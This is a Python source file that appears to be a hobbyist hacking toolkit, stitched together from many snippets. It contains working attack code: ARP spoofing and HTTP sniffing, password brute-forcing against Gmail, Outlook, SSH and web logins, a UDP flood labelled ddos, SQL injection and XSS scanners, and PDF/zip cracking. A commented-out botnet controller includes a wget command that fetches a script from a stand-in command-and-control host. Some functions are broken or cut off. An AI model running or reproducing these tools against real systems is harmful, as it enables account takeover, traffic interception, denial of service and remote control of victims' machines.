import dns.resolver
import socket
import os 
import os
import sys
import time
import random
import requests 
import zipfile
import pikepdf
from tqdm import tqdm
import socket # for connecting
from colorama import init, Fore
from threading import Thread, Lock
from queue import Queue
from cryptography.fernet import Fernet
import os
import requests
import os
from tqdm import tqdm
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
import re
import socket
import scapy.all as scap
import scapy.all as scapy
import paramiko
import socket
import time
from colorama import init, Fore
import hashlib
import  sys
import re
import requests
import random
from bs4 import BeautifulSoup as bs
from scapy.layers.inet import traceroute
import requests
import scapy.all as scapy
from scapy.layers import http
import scapy.all as scapy
import time
from pafy import new
import subprocess 
import smtplib
import pexpect
from pexpect.pxssh import pxssh
#from threading import *
#from socket import *
from termcolor import colored
import socket
from requests import get
from termcolor import colored
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
from geoip import geolite2
from PIL import Image 
from PIL.ExifTags import TAGS 



def DownloadYou():
	url = input("Enter youtube Link here :")
	#url ='https://www.youtube.com/watch?v=iGDJ695dUEM'
	video=new(url)

	dl = video.getbest()
	dl.download()



def DNSLOOKUP():
	target = input("Enter Domain Name / IP For Target:")
	types = ["A","AAAA","MX","NS","SOA","SRV","CNAME"]
	for record in types:
		d = dns.resolver.query(target,record,raise_on_no_answer=False)
		if d.rrset is not None:
			print(d.rrset)

def PORTSCANNER():
	target = input("Ente Ip/Domain Name :")
	ports = [19,20,21,22,23,24,25,80,443]
	for p in range(1,1000):
    		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    		s.settimeout(0.3)
    		print(p,"Done !")
    		r = s.connect_ex((target,p))

    		if r == 0:
        		#bring name service 80 http
        		service = socket.getservbyport(p)
        		print("....[ * {} * is open --> {} ]".format(p,service))

    		s.close()





exist = [] #to remove deplicate
def scanDiscover(ip):

    while True:
        try:
            arp_request = scapy.ARP()
            broadcast = scapy.Ether()
            arp_request.pdst = ip
            broadcast.dst = 'ff:ff:ff:ff:ff:ff'  #broacd cast from router to all devices
            arp_broadcast = broadcast/arp_request #brod caset (myrequest arp ) to all devices
            clients = scapy.srp(arp_broadcast,timeout=3,verbose=False)[0]
            print(clients)
            lst = []
            for element in clients:
                #dictionary
                #0 = sent requst my device
                #1 = replay thats devce that replay on me
                clients = {"ip":element[1].psrc,"mac":element[1].hwsrc}
                lst.append(clients)
            for i in lst:
                if i["mac"] not in exist:
                    print("{} \t\t\t\t {} \n".format(i['ip'],i['mac']))
                    exist.append(i['mac'])
        except:
            print("\Exit...!")
            sys.exit()
       




#ip = "192.168.1.1/24" #192.168.1.1 :: >> 192.168.1.253

#result_list = scan(ip)




def hashing():
	text = input("Enter Sentence:")
	#type of all algoittham hash
	print(hashlib.algorithms_guaranteed)
	print(" ------------------------------------------ ")
	print("\n")
	encorded_txt= hashlib.md5(text.encode())
	encorded_txt1= hashlib.sha1(text.encode())
	encorded_txt2= hashlib.sha256(text.encode())
	encorded_txt3= hashlib.sha512(text.encode())
	encorded_txt4= hashlib.sha3_256(text.encode())
	encorded_txt5= hashlib.sha3_512(text.encode())
	encorded_txt6= hashlib.blake2s(text.encode())
	encorded_txt7= hashlib.blake2b(text.encode())

	print("MD5:",encorded_txt.hexdigest())
	print("SHA-128:",encorded_txt1.hexdigest())
	print("SHA-256:",encorded_txt2.hexdigest())
	print("SHA-512:",encorded_txt3.hexdigest())
	print("SHA3-256:",encorded_txt4.hexdigest())
	print("SH3-512:",encorded_txt5.hexdigest())
	print("BLACK 256 :",encorded_txt6.hexdigest())
	print("BLACK 512:",encorded_txt7.hexdigest())




def Scapping():
	Eml="[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+"
	Eml2="\S{1,}\@\S{1,}"
	#host = "https://www.indeed.com/jobs?q=software+engineer&l="
	host = input("with http://www.host - https//www.host:")
	#host="https://www.indeed.com"
	code = requests.get(host,"html.parser").text
	#print(code)
	regex = re.findall(Eml,code)
	for i in regex:
 		print(i)


#phone-> \+\d{1,}\s{1,}\d{1,}\s\d{1,}\s\d{1,}
#ip-> \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}



def sniffer(inteface):
    print("--------------------------------")
    print("[+] Sniffer Has Started [+]")
    print("--------------------------------")
    scapy.sniff(iface=inteface,store=False, prn = process)

def process(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] ",packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            #store data that sent from rqeuset to request variable
            request = packet[scapy.Raw].load
            print("[+] ->->->" , request)




def get_mac(ip):
    arp_packet = scapy.ARP()
    arp_packet.pdst = ip
    broadcast_packet = scapy.Ether()
    broadcast_packet.dst = 'ff:ff:ff:ff:ff:ff'  # broacd cast from router to all devices
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=3, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spooofer(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 ,pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def Arp():
	target = input("Enter Target IP ==>")
	spoof = input("Enter Spoof Ip==>")
	try:
    		while True:
        		spooofer(target,spoof)
        		spooofer(target,spoof) 
        		print("[+] Packets IS sent ..")
        		time.sleep(5)
	except KeyboardInterrupt:
    		print("Exit ...bye")
    		sys.exit()




#myheaderss = {'User-Agent' :'Iphone 6'}

#r = requests.get('http://arh.bg.ac.rs ', headers =myheaderss)

#print(r.text)


def changeMacAddress(interface,mac):
	subprocess.call(["ifconfig",interface,"down"])
	subprocess.call(["ifconfig",interface,"hw","ether",mac])
	subprocess.call(["ifconfig",interface,"up"])


def ChangeMac():
	interface = str(input("Enter interface to change Mac Address on :"))
	newMacAddress = input("Enter mace address to Change To:")
	beforeChange = subprocess.check_output(["ifconfig",interface])
	changeMacAddress(interface,newMacAddress)
	afterChange = subprocess.check_output(["ifconfig",interface])
	if beforeChange == afterChange:
		print(colored("failed to change mac address to : " + newMacAdress,'red'))
	else:
		print(colored("successfully Done",'green'))



def request(url):
	try:
		return requests.get("http://" + str(url))
	except requests.exceptions.ConnectionError:
		pass


def subDomain():
	target_url = input("Enter Target Url :")
	file = open("common.txt","r")
	for line in file:
		word = line.strip()
		fullurl=target_url + "/" + word
		response = request(fullurl)
		if response:
			print("Discovered Directory at this link:" + str(fullurl))
		print("...")	




def bruteforce(username, url):
	for password in passwods:
		password = password.strip()
		print("[!!] Trying To BruteForce with Password : " + str(password))
		data_dictionary = {"username":username,"password":password,"Login":"submit"}  
		response = requests.post(url,data_dictionary)
		if "Login failed" in str(response.content):
			pass
		else:
			print("[+] Username:--> " + str(username))
			print("[+] Password:--> " + str(password))
			exit()
		


def BruteOutlook():
	smtpserver = smtplib.SMTP("smtp.live.com",587)
	smtpserver.ehlo()
	smtpserver.starttls()
	user = input("[+] Enter Target Email address: ")
	#passwordfile = input("[+] Enter The Path To The Password FIle: ")
	file = open("rockyou.txt","r")
	for password in file:
		password = password.strip("\n")
		try:
			smtpserver.login(user , password)
			print(colored("[+] password found " + str(password), "green"))
			break 

		except smtplib.SMTPAuthenticationError:
			print(colored("[-] Wrong Password :" + str(password), "red"))

	

def BruteGmail():
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.ehlo()
	#ssh tls
	smtpserver.starttls()
	user = input("[+] Enter Target Email address: ")
	#passwordfile = input("[+] Enter The Path To The Password FIle: ")
	file = open("rockyou.txt","r")
	for password in file:
		password = password.strip("\n")
		try:
			smtpserver.login(user , password)
			print(colored("[+] password found " + str(password), "green"))
			break 

		except smtplib.SMTPAuthenticationError:
			print(colored("[-] Wrong Password :" + str(password), "red"))





PROMPT = ['# ' , '>>> ' , '> ', '\$']

def send_command(connection,command):	
	connection.sendline(command)
	connection.expect(PROMPT)
	print(connection.before)
	
 

def connect(user, host , password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh' + ' ' + user + '@' + host 
	#to order to connect with ssh
	child = pexpect.spawn(connStr)
	#returned value fom metaspoitable \\expected return
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	#ret 0ne or zero if 0 so we weren't able to connect if one means we able to connect
	if ret == 0:
		print("[-] Error Connecting")	
		return 
	if ret == 1:
		#need to send yes answer 
		child.sendline('Yes')
		#then after we expect a passwword to enter
		ret = child.expect([pexpect.TIMEOUT , '[P|p]assword: '])
		if ret ==0:
			print("[-] error Connecting sth is wrong")
			return
		#if 1 then we want to send a passwword and expect back answer after 
	child.sendline(password)
	#which means successfully connect to the target 
	child.expect(PROMPT)	
	return child #which our ssh connection 
		


#target : 192.168.1.90
#user :msfadmin
#password : msfadmin
#ssh bandit0@bandit.labs.overthewrit.otg -p 2220
def RemotelySSH():
	host = input("Enter the Host TO Target: ")
	user = input("Enter ssh username : ")
	password = input("Enter SSh password: ")
	child = connect(user,host,password)
	# ; allows to execute two command -> so list shodow file then find root contain ... and run ps 
	#need to grap root password and display running process in target machine 
	#send_command(child,'cat /etc/shadow | grep root;ps')
	send_command(child,'ls;ps')
	send_command(child,'cat /etc/passwd')




	


def retBanner(ip,port):
	try:
		socket.setdefaulttimeout(2)
		s = socket.socket() #make a object
		s.connect((ip,port))
		banner = s.recv(1024) #1024byte
		return banner 
	except:
		return #with no anything



def start():
	#port =22 #port ssh as known 22 by default in metaspoitable open port 
	#ip = "192.168.1.90"
	ip = input("Enter Target IP:")
	#need a variable to storer result back from port 
	for port in range(1,100):
		banner = retBanner(ip,port)
	#if sth back print ...
		if banner:
			print("[+]" + str(ip) + ":" + str(port)+ ":" + str(banner))


def urIp():
	hostname = socket.gethostname()
	local_ip=socket.gethostbyname(hostname)

	public_ip=get('https://api.ipify.org').text
	print(f"HostName: {hostname}")
	print(f"LocalIp:  {local_ip}")
	print(f"PublicIp:  {public_ip}")
	
		
	
'''

class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)

    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)


# list of bots in botnet
botnet = []


# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)




# list user home directory


# download scripts/files etc.
#command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py"""")


'''


BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

 
 
def encrypt(raw, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(raw))
 
 
def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]))
 
 



	
def LocIP(IP):
	locator = geolite2.lookup(IP)
	if locator is None:
		print(colored("[-] Unkown :" , "red"))
		#print("Unknown")
	else:
		#city=locator['city']
		#region=locator['region_code']
		#country=locator['country_name']
		print(colored("[+]  found " + str(locator), "green"))
		#print(colored("[+]  found " + str(city), "green"))
		#print(colored("[+]  found " + str(region), "green"))
		#print(colored("[+]  found " + str(country), "green"))
		#print(locator)


def TraceRoute():
	website = input("Enter Target to TraceRoute:")
	res4,unans = traceroute([website])
	res4.show()
	res4.graph()




def ddos():
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes = random._urandom(1024)

#print(bytes)
	ip =input("Target IP Address :")

	port =1
#port = inpu
#dur=input
	dur=2000000

	timeout = time.time()+float(dur)
	sent=0
	while True:
		if time.time()>timeout:
			break;
		else:
			if port == 65535:
				port =1	
			else:
				pass
		
		sock.sendto(bytes, (ip,port))
		sent = sent +1 
		port = port +1
		print("sent "+ str(sent) +"packets to" + str(ip) +"address through " + str(port))
		
	
	
	

from scapy.all import *
import socket 
from geoip import geolite2

################################################################################




def get_serv(src_port,dst_port):
    try:
       service = socket.getservbyport(src_port)
    except:
       service = socket.getservbyport(dst_port)
    return service




###############################################################################







def locate(ip):
    loc = geolite2.lookup(ip)
    if loc is not None :
       return loc.country , loc.timezone
    else:
       return None 












###############################################################################    
def analyzer(pkt):
    try:
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        ########################
        loc_src = locate(src_ip)
        loc_dst = locate(dst_ip)
        if loc_src is not None :
           country  = loc_src[0]
           timezone = loc_src[1]
        elif loc_dst is not None :
           country  = loc_dst[0]
           timezone = loc_dst[1]
        else:
           country  = "UNkNOWN"
           timezone = "UNkNOWN"
        ########################   
        mac_src = pkt.src
        mac_dst = pkt.dst
        ########################
        if pkt.haslayer(ICMP):
               print("----------------------------------------")
               print("ICMP PACKET...")
               print("SRC-IP : " + src_ip)
               print("DST-IP : " + dst_ip)        
               print("SRC-MAC : " + mac_src)
               print("DST-MAC : " + mac_dst)
               print("TimeZone : " + timezone + " Country : " + country )
               print("Packet Size : " + str(len(pkt[ICMP])))   
               if pkt.haslayer(Raw):
                  print(pkt[Raw].load)
               print("----------------------------------------")   
            
        else :
           src_port = pkt.sport
           dst_port = pkt.dport
           service  = get_serv(src_port,dst_port) 
           if pkt.haslayer(TCP):
               print("----------------------------------------")
               print("TCP PACKET...")
               print("SRC-IP : " + src_ip)
               print("DST-IP : " + dst_ip)        
               print("SRC-MAC : " + mac_src)
               print("DST-MAC : " + mac_dst)
               print("SRC-PORT : " + str(src_port))
               print("DST-PORT : " + str(dst_port))
               print("TimeZone : " + timezone + " Country : " + country )
               print("SERVICE : "+service)
               print("Packet Size : " + str(len(pkt[TCP])))   
               if pkt.haslayer(Raw):
                  print(pkt[Raw].load)
               print("----------------------------------------")   
           if pkt.haslayer(UDP):
               print("----------------------------------------")
               print("UDP PACKET...")
               print("SRC-IP : " + src_ip)
               print("DST-IP : " + dst_ip)        
               print("SRC-MAC : " + mac_src)
               print("DST-MAC : " + mac_dst)
               print("SRC-PORT : " + str(src_port))
               print("DST-PORT : " + str(dst_port))
               print("TimeZone : " + timezone + " Country : " + country )
               print("SERVICE : "+service)
               print("Packet Size : " + str(len(pkt[UDP])))   
               if pkt.haslayer(Raw):
                  print(pkt[Raw].load)
               print("----------------------------------------")   
           
          
    except:
          pass       
     


import requests
# import re # uncomment this for DVWA
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# below code is for logging to your local DVWA
# uncomment it if you want to use this on DVWA
# login_payload = {
#     "username": "admin",
#     "password": "password",
#     "Login": "Login",
# }
# # change URL to the login page of your DVWA login URL
# login_url = "http://localhost:8080/DVWA-master/login.php"

# # login
# r = s.get(login_url)
# token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
# login_payload['user_token'] = token
# s.post(login_url, data=login_payload)


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    """A simple boolean function that determines whether a page 
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in response.content.decode().lower():
            return True
    # no error detected
    return False


def scan_sql_injection(url):
    # test on URL
    for c in "\"'":
        # add quote/double quote character to the URL
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        # make the HTTP request
        res = s.get(new_url)
        if is_vulnerable(res):
            # SQL Injection detected on the URL itself, 
            # no need to preceed for extracting forms and submitting them
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    # test on HTML forms
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["value"] or input_tag["type"] == "hidden":
                    # any input form that has some value or hidden,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{c}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break   


   # import sys
  #  url = sys.argv[1]
   	 		
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)


def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print other available vulnerable forms
    return is_vulnerable




def Robot():
	website = input("Enter you domain start with http://example.com >>>")
	full_domain = website + "/robots.txt"
	try:
		page = requests.get(full_domain,"html.parser").text
		hidden = re.findall("Disallow\: \s{1,}",page)
		for i in hidden:
			link = "[+]" + website+i[10:]
			print(link)
	except:
		print("Exit...")




def dirbustor():
	host = input("Target with starting http://example.com>>>:")
	file = open("common.txt","r")
	r = file.read()
	words = r.splitlines()
	try:
		for word in words:
			url = host + "/" +word
			req = requests.get(url,"html.parser")
			if req.status_code == 200:
				print("[+} Found : "+url)
	except:
		print("Exit ..")
		sys.exit()
	

def exif():
	# open the image path video or imagee 
	img = input("Path image or video:")
	image = Image.open(img) 
	#image = input("Path image or vide:") 
	# extracting the exif metadata 
	exifdata = image.getexif() 
  
	# looping through all the tags present in exifdata 
	for tagid in exifdata: 
    		# getting the tag name instead of tag id 
    		tagname = TAGS.get(tagid, tagid)  
    		# passing the tagid to get its respective value 
    		value = exifdata.get(tagid) 
    
    		# printing the final result 
    		print(f"{tagname:25}: {value}") 


# Python program implementing Image Steganography
 
# PIL module is used to extract
# pixels of image and modify it

 
# Convert encoding data into 8-bit binary
# form using ASCII value of characters
def genData(data):
 
        # list of binary codes
        # of given data
        newd = []
 
        for i in data:
            newd.append(format(ord(i), '08b'))
        return newd
 
# Pixels are modified according to the
# 8-bit binary data and finally returned
def modPix(pix, data):
 
    datalist = genData(data)
    lendata = len(datalist)
    imdata = iter(pix)
 
    for i in range(lendata):
 
        # Extracting 3 pixels at a time
        pix = [value for value in imdata.__next__()[:3] +
                                imdata.__next__()[:3] +
                                imdata.__next__()[:3]]
 
        # Pixel value should be made
        # odd for 1 and even for 0
        for j in range(0, 8):
            if (datalist[i][j] == '0' and pix[j]% 2 != 0):
                pix[j] -= 1
 
            elif (datalist[i][j] == '1' and pix[j] % 2 == 0):
                if(pix[j] != 0):
                    pix[j] -= 1
                else:
                    pix[j] += 1
                # pix[j] -= 1
 
        # Eighth pixel of every set tells
        # whether to stop ot read further.
        # 0 means keep reading; 1 means thec
        # message is over.
        if (i == lendata - 1):
            if (pix[-1] % 2 == 0):
                if(pix[-1] != 0):
                    pix[-1] -= 1
                else:
                    pix[-1] += 1
 
        else:
            if (pix[-1] % 2 != 0):
                pix[-1] -= 1
 
        pix = tuple(pix)
        yield pix[0:3]
        yield pix[3:6]
        yield pix[6:9]
 
def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)
 
    for pixel in modPix(newimg.getdata(), data):
 
        # Putting modified pixels in the new image
        newimg.putpixel((x, y), pixel)
        if (x == w - 1):
            x = 0
            y += 1
        else:
            x += 1
 
# Encode data into image
def encode():
    img = input("Enter image name(with extension) : ")
    image = Image.open(img, 'r')
 
    data = input("Enter data to be encoded : ")
    if (len(data) == 0):
        raise ValueError('Data is empty')
 
    newimg = image.copy()
    encode_enc(newimg, data)
 
    new_img_name = input("Enter the name of new image(with extension) : ")
    newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))
 
# Decode the data in the image
def decode():
    img = input("Enter image name(with extension) : ")
    image = Image.open(img, 'r')
 
    data = ''
    imgdata = iter(image.getdata())
 
    while (True):
        pixels = [value for value in imgdata.__next__()[:3] +
                                imgdata.__next__()[:3] +
                                imgdata.__next__()[:3]]
 
        # string of binary data
        binstr = ''
 
        for i in pixels[:8]:
            if (i % 2 == 0):
                binstr += '0'
            else:
                binstr += '1'
 
        data += chr(int(binstr, 2))
        if (pixels[-1] % 2 != 0):
            return data
 
# Main Function
def stegraphy():
    a = int(input(":: Welcome to Steganography ::\n"
                        "1. Encode\n2. Decode\n"))
    if (a == 1):
        encode()
 
    elif (a == 2):
        print("Decoded Word :  " + decode())
    else:
        raise Exception("Enter correct input")
 

 


def read_file(file):
    """Reads en entire file and returns file bytes."""
    BUFFER_SIZE = 16384 # 16 kilo bytes
    b = b""
    with open(file, "rb") as f:
        while True:
            # read 16K bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if bytes_read:
                # if there is bytes, append them
                b += bytes_read
            else:
                # if not, nothing to do here, break out of the loop
                break
    return b

def hasfile():
    # read some file
    print(" Path file name ")
    f = input(":")
    file_content = read_file(f)
    # some chksums:
    # hash with MD5 (not recommended)
    print("MD5:", hashlib.md5(file_content).hexdigest())

    # hash with SHA-2 (SHA-256 & SHA-512)
    print("SHA-256:", hashlib.sha256(file_content).hexdigest())

    print("SHA-512:", hashlib.sha512(file_content).hexdigest())

    # hash with SHA-3
    print("SHA-3-256:", hashlib.sha3_256(file_content).hexdigest())

    print("SHA-3-512:", hashlib.sha3_512(file_content).hexdigest())

    # hash with BLAKE2
    # 256-bit BLAKE2 (or BLAKE2s)
    print("BLAKE2c:", hashlib.blake2s(file_content).hexdigest())
    # 512-bit BLAKE2 (or BLAKE2b)
    print("BLAKE2b:", hashlib.blake2b(file_content).hexdigest())
    




def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()


def encrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and write it
    """
    
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)


    print("Done")	
	

def decrypt(filename, key):
    """
    Given a filename (str) and key (bytes), it decrypts the file and write it
    """
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

    print("Done")	
	

  
def Sysmatric():
	print("1.Encrypt:")	
	print("2.Decrypt:")
	select = input(":")

	if select =="1":
		f=input("Path name file :")
		if os.path.exists("key.key")==False:
			write_key()
			key=load_key()	
		else:
			key=load_key()	

		encrypt(f,key)
	elif select=="2":
		f=input("Path name file :")
		key=load_key()	
		decrypt(f,key)
	else:
		print("Out of The Index!!!!!")		
	

#write_key()

	
	



#encrypt("Lion.txt",key)

#decrypt("Lion.txt",key)
#encrypt()



# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        returning = False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        returning = False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        returning = is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        returning = True
    finally:
        client.close()
        return returning



def sshBrute():   
	host = input("Host:")  
	user = input("User:")
	passlist = input("Wordlist:")
    

# read the file
	passlist = open(passlist).read().splitlines()
# brute-force
	for password in passlist:
		if is_ssh_open(host, user, password):
		# if combo is valid, save it to a file
			open("credentials.txt", "w").write(f"{user}@{host}:{password}")
			break
            	
            	




# some colors
init()
GREEN = Fore.GREEN
RESET = Fore.RESET
GRAY = Fore.LIGHTBLACK_EX

# number of threads, feel free to tune this parameter as you wish
N_THREADS = 200
# thread queue
q = Queue()
print_lock = Lock()

def port_scan(port):
    """
    Scan a port on the global variable `host`
    """
    try:
        s = socket.socket()
        s.connect((host, port))
    except:
        with print_lock:
            print(f"{GRAY}{host:15}:{port:5} is closed  {RESET}", end='\r')
    else:
        with print_lock:
            print(f"{GREEN}{host:15}:{port:5} is open    {RESET}")
    finally:
        s.close()


def scan_thread():
    global q
    while True:
        # get the port number from the queue
        worker = q.get()
        # scan that port number
        port_scan(worker)
        # tells the queue that the scanning for that port 
        # is done
        q.task_done()


def fscan(host, ports):
    global q
    for t in range(N_THREADS):
        # for each thread, start it
        t = Thread(target=scan_thread)
        # when we set daemon to true, that thread will end when the main thread ends
        t.daemon = True
        # start the daemon thread
        t.start()

    for worker in ports:
        # for each port, put that port into the queue
        # to start scanning
        q.put(worker)
    
    # wait the threads ( port scanners ) to finish
    q.join()



def infoscan():
	global host
	print("Port range to scan, default is 1-65535 (all ports)")
	host = input("Host:")
	port_range = input("Ports with split - 5-10>>>:") 
	start_port, end_port = port_range.split("-")
	start_port, end_port = int(start_port), int(end_port)
	ports = [ p for p in range(start_port, end_port)]
	#ports = [ p for p in range(1, 10)]
	#print(ports)

	#[1, 2, 3, 4, 5, 6, 7, 8, 9]

	fscan(host, ports)


def pdf():
	# load password list
	file = input("Wordlist path:")
	#passwords = [ line.strip() for line in open("wordlist.txt") ]
	pdf = input("Protected pdf file:")
	passwords = [ line.strip() for line in open(file) ]
	# iterate over passwords
	for password in tqdm(passwords, "Decrypting PDF"):
    		try:
        		# open PDF file
        		#with pikepdf.open("foo-protected.pdf", password=password) as pdf:
        		with pikepdf.open(pdf, password=password) as pdf:
            			# Password decrypted successfully, break out of the loop
            			print("[+] Password found:", password)
            			break
    		except pikepdf._qpdf.PasswordError as e:
        		# wrong password, just continue in the loop
        		continue
        		
        		
  



def zipf():
	# the password list path you want to use
	wordlist = input("wordlist:")
	# the zip file you want to crack its password
	zip_file = input("zip protected file:")
	# initialize the Zip File object
